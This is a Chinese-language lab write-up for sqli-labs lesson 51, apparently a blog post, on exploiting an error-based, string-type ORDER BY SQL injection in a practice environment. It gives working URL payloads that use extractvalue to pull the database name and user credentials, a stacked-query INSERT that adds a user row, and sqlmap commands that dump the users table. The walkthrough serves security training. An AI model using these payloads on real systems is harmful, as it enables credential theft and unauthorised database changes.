---
title: sqli-labs lession-51-GET 基于错误-字符型堆叠注入-OrderBy注入
date: 2018-11-19 09:04:44
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-51-GET 基于错误-字符型堆叠注入-OrderBy注入

---

## 登录界面

![001](/img/sql/Lesson-51/001.png)

## 注入

### 判断类型

输入单引号报错

![002](/img/sql/Lesson-51/002.png)

通过报错可以判断单引号闭合。

### 获取数据库

`http://10.60.17.35:8082/Less-51/?sort=1'+and+extractvalue(null,concat(0x7e,database(),0x7e))%23`

![003](/img/sql/Lesson-51/003.png)

### 获取字段

中间过程和上一课一样,直接省略

{% post_link sqli-labs-lession-50-GET-基于错误-数字型堆叠注入-OrderBy注入  点击查看Lesson-50%}

`http://10.60.17.35:8082/Less-51/?sort=1'+and+extractvalue(null,concat(0x7e,(select concat(0x7e,username,0x7e,password)from security.users limit 0,1),0x7e))%23`

![004](/img/sql/Lesson-51/004.png)

## 堆叠注入

`http://10.60.17.35:8082/Less-51/?sort=1';insert into users(id,username,password)values(101,'huai1','dan2')%23`

![005](/img/sql/Lesson-51/005.png)

## SQLMAP

`sqlmap -u http://10.60.17.35:8082/Less-51/?sort=1 --technique E --dbms mysql `

![006](/img/sql/Lesson-51/006.png)

![007](/img/sql/Lesson-51/007.png)

`sqlmap -u http://10.60.17.35:8082/Less-51/?sort=1 --technique E --dbms mysql -D security -T users -C username,password --dump --threads 20`

![008](/img/sql/Lesson-51/008.png)

![009](/img/sql/Lesson-51/009.png)

